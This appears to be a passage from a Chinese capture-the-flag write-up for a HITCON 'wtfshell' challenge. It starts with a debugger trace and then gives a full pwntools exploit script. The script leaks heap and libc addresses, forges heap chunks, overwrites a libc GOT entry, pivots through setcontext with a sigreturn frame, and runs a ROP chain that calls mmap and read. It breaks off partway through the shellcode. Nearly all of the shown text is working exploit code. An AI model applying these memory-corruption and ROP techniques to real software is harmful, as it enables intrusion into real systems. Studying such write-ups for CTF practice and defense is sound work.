<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> ► <span class="number">0x100062</span>    syscall  &lt;SYS_writev&gt;</span><br><span class="line">        fd: <span class="number">0x1</span> (/dev/pts/<span class="number">1</span>)</span><br><span class="line">        iovec: <span class="number">0x55ba73ee5488</span> —▸ <span class="number">0x55ba73ee5498</span> ◂— <span class="number">0x3f7b6e6f63746968</span> (<span class="string">&#x27;hitcon&#123;?&#x27;</span>)</span><br><span class="line">        count: <span class="number">0x1</span></span><br><span class="line">----------------------------------------------------------------------     </span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsi rsp <span class="number">0x55ba73ee5488</span> —▸ <span class="number">0x55ba73ee5498</span> ◂— <span class="number">0x3f7b6e6f63746968</span> (<span class="string">&#x27;hitcon&#123;?&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│         <span class="number">0x55ba73ee5490</span> ◂— <span class="number">0x100</span></span><br></pre></td></tr></table></figure>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line"><span class="comment">#challenge = &#x27;./wtfshell_debug&#x27;</span></span><br><span class="line">challenge = <span class="string">&#x27;./wtfshell1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge,key)</span></span><br><span class="line">    p = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;172.51.221.20&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;√&quot;</span>,op)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">qq</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;qq&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lol</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;lol.-l&quot;</span>)</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rip</span>(<span class="params">filename,data</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;rip.&quot;</span>+filename) <span class="comment"># filename == NULL =&gt; stdout</span></span><br><span class="line">    p.sendline(data)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newfile</span>(<span class="params">filename,flag</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;nsfw.&quot;</span>+filename+<span class="string">&quot;.&quot;</span>+<span class="built_in">str</span>(flag))</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">* --: 0 (non-readable &amp; non-writable)</span></span><br><span class="line"><span class="string">* -w: 1 (write only)</span></span><br><span class="line"><span class="string">* r-: 2 (read only)</span></span><br><span class="line"><span class="string">* rw: 3 (readable &amp; writable)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">writefile</span>(<span class="params">filename,data</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;wtf.&quot;</span>+data+<span class="string">&quot;.&quot;</span>+filename)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">showfile</span>(<span class="params">filename</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;omfg.&quot;</span>+filename)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delfile</span>(<span class="params">filename</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;gtfo.&quot;</span>+filename)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">deluser</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;ouo&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newuser</span>(<span class="params">username</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;stfu.&quot;</span>+username)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">newpassword</span>(<span class="params">username,password</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;asap.&quot;</span>+username) <span class="comment"># NULL == root</span></span><br><span class="line">    p.sendlineafter(<span class="string">&quot;password:&quot;</span>,password)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;retype password:&quot;</span>,password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeuser</span>(<span class="params">username</span>):</span></span><br><span class="line">    cmd(<span class="string">&quot;sus.&quot;</span>+username) <span class="comment"># NULL == root</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shit</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;shit&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reboot</span>():</span></span><br><span class="line">    cmd(<span class="string">&quot;irl&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leakheap</span>(<span class="params">username,password</span>):</span></span><br><span class="line">    heap_addr = <span class="string">&quot;\x80&quot;</span></span><br><span class="line">    try_addr = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0xff</span>):</span><br><span class="line">                <span class="keyword">if</span>(j==<span class="number">0xa</span>):</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="comment">#success(&quot;heap_addr &gt;&gt; &quot; + hex(u64(heap_addr.ljust(0x8,&#x27;\0&#x27;))))</span></span><br><span class="line">                try_addr = heap_addr + <span class="built_in">chr</span>(j)</span><br><span class="line">                cmd(<span class="string">&quot;asap.&quot;</span>+username)</span><br><span class="line">                p.sendlineafter(<span class="string">&quot;password:&quot;</span>,password)</span><br><span class="line">                p.sendlineafter(<span class="string">&quot;retype password:&quot;</span>,password+try_addr)</span><br><span class="line">                ret = p.recvuntil(<span class="string">&quot;\n&quot;</span>,timeout=<span class="number">0.1</span>)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">b&quot;asap: &quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> ret:</span><br><span class="line">                    heap_addr += <span class="built_in">chr</span>(j)</span><br><span class="line">                    p.sendline(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">return</span> heap_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_reverse</span>(<span class="params">filename,payload</span>):</span></span><br><span class="line">    whole_size = <span class="built_in">len</span>(payload)+<span class="number">1</span></span><br><span class="line">    no_null_payload = payload.replace(<span class="string">&#x27;\x00&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)-<span class="number">0x10</span>):</span><br><span class="line">        <span class="keyword">if</span> no_null_payload[whole_size-i-<span class="number">2</span>:whole_size-i-<span class="number">1</span>] == <span class="string">&#x27;a&#x27;</span>:</span><br><span class="line">            writefile(filename,no_null_payload[<span class="number">0</span>:whole_size-i-<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">newuser(<span class="string">&quot;yhellow&quot;</span>)</span><br><span class="line">newuser(<span class="string">&quot;yhellow2&quot;</span>)</span><br><span class="line"></span><br><span class="line">heap_addr = u64(leakheap(<span class="string">&quot;yhellow2&quot;</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x40</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\0&#x27;</span>))</span><br><span class="line">heap_base = heap_addr - <span class="number">0x880</span></span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line"></span><br><span class="line">presize = <span class="number">0xd10</span></span><br><span class="line">payload = p16(presize) + <span class="string">&quot;/&quot;</span>*<span class="number">6</span></span><br><span class="line"></span><br><span class="line">newfile(<span class="string">&quot;1&quot;</span>,<span class="number">3</span>)</span><br><span class="line">writefile(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x300</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,payload+<span class="string">&quot;b&quot;</span>*<span class="number">0xf8</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;c&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;e&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;f&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;g&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;h&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;i&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;g&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">newfile(<span class="string">&quot;2&quot;</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;3&quot;</span>,<span class="number">3</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;b&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">writefile(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;c&quot;</span>*(<span class="number">0x400</span>-<span class="number">6</span>))</span><br><span class="line">writefile(<span class="string">&quot;3&quot;</span>,<span class="string">&quot;d&quot;</span>*<span class="number">0x310</span>)</span><br><span class="line"></span><br><span class="line">newfile(<span class="string">&quot;4&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;5&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;6&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;7&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;8&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;9&quot;</span>*<span class="number">0x3f8</span>,<span class="number">3</span>)</span><br><span class="line">delfile(<span class="string">&quot;4&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line">delfile(<span class="string">&quot;5&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line">delfile(<span class="string">&quot;6&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line">delfile(<span class="string">&quot;7&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line">delfile(<span class="string">&quot;8&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line">delfile(<span class="string">&quot;9&quot;</span>*<span class="number">0x3f8</span>)</span><br><span class="line"></span><br><span class="line">fakechunk_addr = heap_base + <span class="number">0x3f0</span></span><br><span class="line">rip(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;e&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line">reboot()</span><br><span class="line"></span><br><span class="line">newfile(<span class="string">&quot;1&quot;</span>,<span class="number">3</span>)</span><br><span class="line">writefile(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;f&quot;</span>*<span class="number">0x310</span>)</span><br><span class="line">rip(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;e&quot;</span>*<span class="number">0x100</span>)</span><br><span class="line"></span><br><span class="line">newfile(<span class="string">&quot;4&quot;</span>,<span class="number">3</span>)</span><br><span class="line">payload = <span class="string">&quot;p&quot;</span>*<span class="number">0x60</span> </span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(presize+<span class="number">1</span>) </span><br><span class="line">payload += p64(fakechunk_addr+<span class="number">0x18</span>) + p64(fakechunk_addr+<span class="number">0x20</span>) </span><br><span class="line">payload += p64(fakechunk_addr+<span class="number">0x10</span>) + p64(fakechunk_addr+<span class="number">0x18</span>)</span><br><span class="line">payload += p64(fakechunk_addr) + p64(fakechunk_addr)</span><br><span class="line">write_reverse(<span class="string">&quot;4&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">newfile(<span class="string">&quot;2&quot;</span>,<span class="number">3</span>)</span><br><span class="line">writefile(<span class="string">&quot;2&quot;</span>,<span class="string">&quot;k&quot;</span>*<span class="number">0x310</span>)</span><br><span class="line">payload = <span class="string">&quot;rip.&quot;</span>+<span class="string">&quot;a&quot;</span>*(<span class="number">0x400</span>-<span class="number">4</span>)</span><br><span class="line">cmd(payload)</span><br><span class="line"></span><br><span class="line">newfile(<span class="string">&quot;3&quot;</span>*<span class="number">0x2f0</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;4&quot;</span>*<span class="number">0x2f0</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;5&quot;</span>*<span class="number">0x2f0</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;6&quot;</span>*<span class="number">0x2f0</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;7&quot;</span>*<span class="number">0x2f0</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;8&quot;</span>*<span class="number">0x2f0</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;9&quot;</span>*<span class="number">0x2f0</span>,<span class="number">3</span>)</span><br><span class="line">delfile(<span class="string">&quot;3&quot;</span>*<span class="number">0x2f0</span>)</span><br><span class="line">delfile(<span class="string">&quot;4&quot;</span>*<span class="number">0x2f0</span>)</span><br><span class="line">delfile(<span class="string">&quot;5&quot;</span>*<span class="number">0x2f0</span>)</span><br><span class="line">delfile(<span class="string">&quot;6&quot;</span>*<span class="number">0x2f0</span>)</span><br><span class="line">delfile(<span class="string">&quot;7&quot;</span>*<span class="number">0x2f0</span>)</span><br><span class="line">delfile(<span class="string">&quot;8&quot;</span>*<span class="number">0x2f0</span>)</span><br><span class="line">delfile(<span class="string">&quot;9&quot;</span>*<span class="number">0x2f0</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x2f0</span> + p64(<span class="number">0</span>) + p64(<span class="number">0x41</span>)</span><br><span class="line">write_reverse(<span class="string">&quot;2&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">delfile(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">newfile(<span class="string">&quot;5&quot;</span>*<span class="number">0x30</span>,<span class="number">3</span>)</span><br><span class="line">newfile(<span class="string">&quot;6&quot;</span>*<span class="number">0x30</span>,<span class="number">3</span>)</span><br><span class="line">delfile(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">newfile(<span class="string">&quot;7&quot;</span>*<span class="number">0x30</span>,<span class="number">3</span>)</span><br><span class="line">writefile(<span class="string">&quot;5&quot;</span>*<span class="number">0x30</span>,<span class="string">&quot;5&quot;</span>*<span class="number">0x360</span>)</span><br><span class="line"></span><br><span class="line">libc_addr = heap_base + <span class="number">0x760</span></span><br><span class="line">name_addr = heap_base + <span class="number">0x26c0</span></span><br><span class="line">payload = <span class="string">&quot;x&quot;</span>*<span class="number">0x338</span></span><br><span class="line">payload += p64(<span class="number">0x31</span>)+p64(name_addr)+ p64(libc_addr)</span><br><span class="line"></span><br><span class="line">write_reverse(<span class="string">&quot;7&quot;</span>*<span class="number">0x30</span>,payload)</span><br><span class="line">showfile(<span class="string">&quot;6&quot;</span>*<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">libc_base = leak_addr - <span class="number">0x1f6cc0</span></span><br><span class="line">success(<span class="string">&quot;leak_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(leak_addr))</span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">strtok_libc_got = <span class="number">0x0000000001F6040</span> + libc_base</span><br><span class="line">success(<span class="string">&quot;strtok_libc_got &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(strtok_libc_got))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;x&quot;</span>*<span class="number">0x338</span></span><br><span class="line">payload += p64(<span class="number">0x31</span>)+p64(name_addr)+ p64(strtok_libc_got)</span><br><span class="line">write_reverse(<span class="string">&quot;7&quot;</span>*<span class="number">0x30</span>,payload)</span><br><span class="line"></span><br><span class="line">setcontext_libc = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">mmap_libc = libc_base + libc.sym[<span class="string">&#x27;mmap&#x27;</span>]</span><br><span class="line">read_libc = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;setcontext_libc+61 &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(setcontext_libc+<span class="number">61</span>))</span><br><span class="line">success(<span class="string">&quot;read_libc &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(read_libc))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">magic_gadget = libc_base + <span class="number">0x000000000008c225</span> <span class="comment"># mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax;</span></span><br><span class="line">writefile(<span class="string">&quot;6&quot;</span>*<span class="number">0x30</span>,p64(magic_gadget)[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line"></span><br><span class="line">pop_rax_ret = libc_base + <span class="number">0x000000000003f8e3</span></span><br><span class="line">pop_rbx_ret = libc_base + <span class="number">0x000000000002f1d1</span></span><br><span class="line">pop_rcx_ret = libc_base + <span class="number">0x00000000000e236e</span></span><br><span class="line">pop_rdi_ret = libc_base + <span class="number">0x0000000000023b65</span></span><br><span class="line">pop_rsi_ret = libc_base + <span class="number">0x00000000000251be</span></span><br><span class="line">pop_rdx_ret = libc_base + <span class="number">0x0000000000165f32</span></span><br><span class="line">pop_r8_ret  = libc_base + <span class="number">0x000000000008c27e</span></span><br><span class="line"></span><br><span class="line">ROP_addr = heap_base + <span class="number">0x400</span></span><br><span class="line">frame_addr = heap_base + <span class="number">0xd00</span> + <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rdi = <span class="number">0</span></span><br><span class="line">frame.rsi = ROP_addr</span><br><span class="line">frame.rdx = <span class="number">0x200</span></span><br><span class="line">frame.rsp = ROP_addr</span><br><span class="line">frame.rip = read_libc</span><br><span class="line"></span><br><span class="line">payload = p64(setcontext_libc+<span class="number">61</span>) + p64(frame_addr) + <span class="built_in">bytes</span>(frame)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">cmd(payload)</span><br><span class="line"></span><br><span class="line">rop =  p64(pop_rdi_ret) + p64(<span class="number">0x100000</span>)</span><br><span class="line">rop += p64(pop_rsi_ret) + p64(<span class="number">0x1000</span>)</span><br><span class="line">rop += p64(pop_rdx_ret) + p64(<span class="number">6</span>)</span><br><span class="line">rop += p64(pop_rcx_ret) + p64(<span class="number">0x22</span>)</span><br><span class="line">rop += p64(pop_r8_ret) + p64(<span class="number">0xffffffff</span>)</span><br><span class="line">rop += p64(mmap_libc)</span><br><span class="line">rop += p64(pop_rdi_ret) + p64(<span class="number">0</span>)</span><br><span class="line">rop += p64(pop_rsi_ret) + p64(<span class="number">0x100000</span>)</span><br><span class="line">rop += p64(pop_rdx_ret) + p64(<span class="number">0x200</span>)</span><br><span class="line">rop += p64(read_libc)</span><br><span class="line">rop += p64(<span class="number">0x100008</span>)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(rop)</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    xor rdi, rdi;</span></span><br><span class="line"><span class="string">    mov rax, 3;</span></span><br><span class="line"><span class="string">    syscall;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    mov rbx, 3;</span></span><br><span class="line"><span class="string">    mov rcx, 0x100000;</span></span><br><span class="line"><span class="string">    xor rdx, rdx;</span></span><br><span class="line"><span class="string">    mov rax, 0x127;</span></span><br><span class="line"><span class="string">    int 0x80;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">    xor rdi, rdi;</span></span><br><span class="line"><span class="string">    push rsp;</span></span><br><span class="line"><span class="string">    pop rcx;</span></span><br><span class="line"><span class="string">    mov rbx, rcx;</span></span><br><span class="line"><span class="string">    mov rsi, rcx;</span></span><br><span class="line"><span class="string">    mov rdx, 0x100;</span></span><br><span class="line"><span class="string">    xor rax, rax;</span></span><br><span class="line"><span class="string">    syscall;</span></span><br><span class="line"><span 